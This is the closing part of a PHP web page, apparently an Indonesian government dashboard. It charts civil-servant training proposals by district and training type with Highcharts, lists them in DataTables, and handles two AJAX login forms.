                    text: 'Jumlah Usulan di Kabupaten / Kota'
                },
                xAxis: {
                    categories: [
                        <?php
                        for ($jmlbaris = 0; $jmlbaris < $x; $jmlbaris++) {
                            echo "'" . $namakabkot[$jmlbaris] . "',";
                        }
                        ?>
                    ]
                },
                yAxis: {
                    tickInterval: 50,
                    min: 0,
                    title: {
                        text: 'Jumlah usulan'
                    }
                },
                legend: {
                    enabled: false
                },
                plotOptions: {
                    column: {
                        dataLabels: {
                            enabled: true,
                            style: {
                                color: '#606060',
                                fontSize: '8px',
                                //fontWeight:'bold',
                                //textOutline:'1px contrast'
                            }
                        }
                    }
                },
                //colors: ['#E20632', '#099A10'],
                series: [{
                    name: 'Jumlah usulan',
                    data: [
                        <?php
                        for ($jmlbaris = 0; $jmlbaris < $x; $jmlbaris++) {
                            echo $jmlusulankabkot[$jmlbaris] . ",";
                        }
                        ?>
                    ]
                }]
            });

            //Grafik Rekap usulan dari PNS Pemprov berdasarkan jenis pelatihan
            Highcharts.chart('grafikjnsdiklat1', {
                chart: {
                    plotBackgroundColor: null,
                    plotBorderWidth: null,
                    plotShadow: false,
                    type: 'pie'
                },
                title: {
                    text: 'Jumlah Usulan dari ASN Pemprov'
                },
                subtitle: {
                    text: 'Berdasarkan jenis pelatihan'
                },
                tooltip: {
                    pointFormat: '{series.name}: <b>{point.y:.0f}</b>'
                },
                plotOptions: {
                    pie: {
                        allowPointSelect: true,
                        cursor: 'pointer',
                        dataLabels: {
                            enabled: true,
                            format: '<b>{point.name}</b>: {point.y:.0f}',
                            style: {
                                color: (Highcharts.theme && Highcharts.theme.contrastTextColor) || 'black'
                            }
                        }
                    }
                },
                series: [{
                    name: 'Jumlah usulan',
                    colorByPoint: true,
                    data: [
                        <?php
                        while ($baris1 = mysqli_fetch_array($queryrekapusulan1, MYSQLI_ASSOC)) {
                            ?>
                                                                {
                                name: '<?= $baris1['nmjenisdiklat'] ?>',
                                y: <?= $baris1['jumlahusulan'] ?>
                            },
                            <?php
                        }
                        ?>

                    ]
                }]
            });

            //Grafik Rekap usulan dari PNS Kab / Kota berdasarkan jenis pelatihan
            Highcharts.chart('grafikjnsdiklat', {
                chart: {
                    plotBackgroundColor: null,
                    plotBorderWidth: null,
                    plotShadow: false,
                    type: 'pie'
                },
                title: {
                    text: 'Jumlah usulan dari ASN Kabupaten / Kota'
                },
                subtitle: {
                    text: 'Berdasarkan jenis pelatihan'
                },
                tooltip: {
                    pointFormat: '{series.name}: <b>{point.y:.0f}</b>'
                },
                plotOptions: {
                    pie: {
                        allowPointSelect: true,
                        cursor: 'pointer',
                        dataLabels: {
                            enabled: true,
                            format: '<b>{point.name}</b>: {point.y:.0f}',
                            style: {
                                color: (Highcharts.theme && Highcharts.theme.contrastTextColor) || 'black'
                            }
                        }
                    }
                },
                series: [{
                    name: 'Jumlah usulan',
                    colorByPoint: true,
                    data: [
                        <?php
                        while ($baris = mysqli_fetch_array($queryrekapusulan, MYSQLI_ASSOC)) {
                            ?>
                                                                {
                                name: '<?= $baris['nmjenisdiklat'] ?>',
                                y: <?= $baris['jumlahusulan'] ?>
                            },
                            <?php
                        }
                        ?>
                    ]
                }]
            });
            $('#tabelusulan').dataTable({
                processing: true,
                ajax: "listdata/",
                order: [[0, 'asc'], [2, 'asc']],
                //                ordering: false,
                lengthMenu: [[5, 10], [5, 10]],
                pageLength: 5,
                language: {
                    "url": "plugins/dataTables/Indonesian.json"
                },
                initComplete: function () {

                    this.api().columns([0]).every(function () {
                        var column = this;
                        var select = $('<select class="form-control input-sm" style="width: 100%"><option value="">--Semua SKPD--</option></select>')
                            .appendTo($(column.footer()).empty())
                            .on('change', function () {
                                var val = $.fn.dataTable.util.escapeRegex(
                                    $(this).val()
                                );
                                column
                                    .search(val ? '^' + val + '$' : '', true, false)
                                    .draw();
                            });
                        column.data().unique().sort().each(function (d, j) {
                            select.append('<option value="' + d + '">' + d + '</option>');
                        });
                    });
                },
                rowsGroup: [// Always the array (!) of the column-selectors in specified order to which rows groupping is applied
                    // (column-selector could be any of specified in https://datatables.net/reference/type/column-selector)
                    0,
                    1,
                    2,
                    3
                ],
            });
            $('#tabelusulan1').dataTable({
                processing: true,
                ajax: "listdata1/",
                order: [[0, 'asc']],
                //                ordering: false,
                lengthMenu: [[5, 10], [5, 10]],
                pageLength: 5,
                language: {
                    "url": "plugins/dataTables/Indonesian.json"
                },
                initComplete: function () {

                    this.api().columns([0]).every(function () {
                        var column = this;
                        var select = $('<select class="form-control input-sm" style="width: 100%"><option value="">--Semua Kabupaten / Kota--</option></select>')
                            .appendTo($(column.footer()).empty())
                            .on('change', function () {
                                var val = $.fn.dataTable.util.escapeRegex(
                                    $(this).val()
                                );
                                column
                                    .search(val ? '^' + val + '$' : '', true, false)
                                    .draw();
                            });
                        column.data().unique().sort().each(function (d, j) {
                            select.append('<option value="' + d + '">' + d + '</option>');
                        });
                    });
                }
            });
            $("#formpns").submit(function (e) {
                //disable the default form submission
                e.preventDefault();
                //grab all form data
                var formData = new FormData(this);
                $('#btn-loginpns').html('<img src="img/ajax-loader.gif" width="16" height="16" alt=""> Silakan tunggu');
                $('#btn-loginpns').attr('disabled', 'disabled');
                $.ajax({
                    url: 'prosespns.php',
                    type: 'POST',
                    data: formData,
                    //async: false,
                    //cache: false,
                    contentType: false,
                    processData: false,
                    success: function success(returndata) {
                        switch (returndata) {
                            case 'ok':
                                $('#alertpns').html('Login berhasil!');
                                window.location = 'pns/';
                                break;
                            case 'nipsalah':
                                $('#alertpns').html('NIP atau NIK salah');
                                $('#btn-loginpns').html('LOGIN');
                                $('#btn-loginpns').removeAttr('disabled');
                                break;
                            case 'captchafalse':
                                $('#alertpns').html('Kode captcha tidak valid');
                                $('#btn-loginpns').html('LOGIN');
                                $('#btn-loginpns').removeAttr('disabled');
                                break;
                            default:
                                $('#alertpns').html('Mohon maaf, terjadi kesalahan sistem. Silakan coba lagi.');
                                $('#btn-loginpns').html('LOGIN');
                                $('#btn-loginpns').removeAttr('disabled');
                                break;
                        }

                    }
                });
                //alert($('#captcha').val());
                return false;
            });
            $("#formpnskabkota").submit(function (e) {
                //disable the default form submission
                e.preventDefault();
                //grab all form data
                var formData = new FormData(this);
                $('#btn-loginpns2').html('<img src="img/ajax-loader.gif" width="16" height="16" alt=""> Silakan tunggu');
                $('#btn-loginpns2').attr('disabled', 'disabled');
                $.ajax({
                    url: 'prosespnskabkot.php',
                    type: 'POST',
                    data: formData,
                    //async: false,
                    //cache: false,
                    contentType: false,
                    processData: false,
                    success: function success(returndata) {
                        console.log(returndata);
                        switch (returndata) {
                            case 'ok':
                                $('#alertpns2').html('Login berhasil!');
                                window.location = 'pnskabkota/';
                                break;
                            case 'nipsalah':
                                $('#alertpns2').html('NIP salah');
                                $('#btn-loginpns2').html('LOGIN');
                                $('#btn-loginpns2').removeAttr('disabled');
                                break;
                            case 'captchafalse':
                                $('#alertpns2').html('Kode captcha tidak valid');
                                $('#btn-loginpns2').html('LOGIN');
                                $('#btn-loginpns2').removeAttr('disabled');
                                break;
                            default:
                                $('#alertpns2').html('Mohon maaf, terjadi kesalahan sistem. Silakan coba lagi.');
                                $('#btn-loginpns2').html('LOGIN');
                                $('#btn-loginpns2').removeAttr('disabled');
                                break;
                        }
                    }
                });
                //alert($('#captcha').val());
                return false;
            });
        });
    </script>
</body>

</html>